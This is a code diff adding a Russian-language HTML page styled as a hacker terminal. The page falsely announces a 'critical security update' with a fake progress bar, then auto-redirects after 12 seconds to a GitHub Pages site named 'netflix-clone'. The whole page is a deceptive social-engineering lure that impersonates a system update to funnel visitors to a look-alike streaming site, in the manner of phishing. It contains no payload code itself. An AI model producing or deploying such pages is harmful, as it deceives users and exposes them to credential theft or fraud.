@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Системное обновление</title>
+    <meta http-equiv="refresh" content="12;url=https://rajkumar-229.github.io/netflix-clone/">
+    <style>
+        body { font-family: 'Courier New', monospace; background: #1a1a1a; color: #00ff00; padding: 50px; }
+        .terminal { background: #000; border: 1px solid #00ff00; padding: 30px; border-radius: 5px; }
+        .blink { animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+        .progress { background: #333; height: 20px; border-radius: 10px; margin: 20px 0; }
+        .progress-bar { background: #00ff00; height: 100%; width: 0%; border-radius: 10px; transition: width 12s linear; }
+    </style>
+</head>
+<body>
+    <div class="terminal">
+        <h1>> СИСТЕМНОЕ ОБНОВЛЕНИЕ</h1>
+        <p>> Загрузка критического обновления безопасности...</p>
+        <p>> Статус: <span class="blink">ВЫПОЛНЯЕТСЯ</span></p>
+        <div class="progress">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <p>> Перенаправление на портал обновления через 12 секунд</p>
+        <p>> <a href="https://rajkumar-229.github.io/netflix-clone/" style="color: #00ff00;">[ ПЕРЕЙТИ СЕЙЧАС ]</a></p>
+    </div>
+    
+    <script>
+        setTimeout(function() {
+            document.getElementById('progressBar').style.width = '100%';
+        }, 100);
+    </script>
+</body>
+</html>
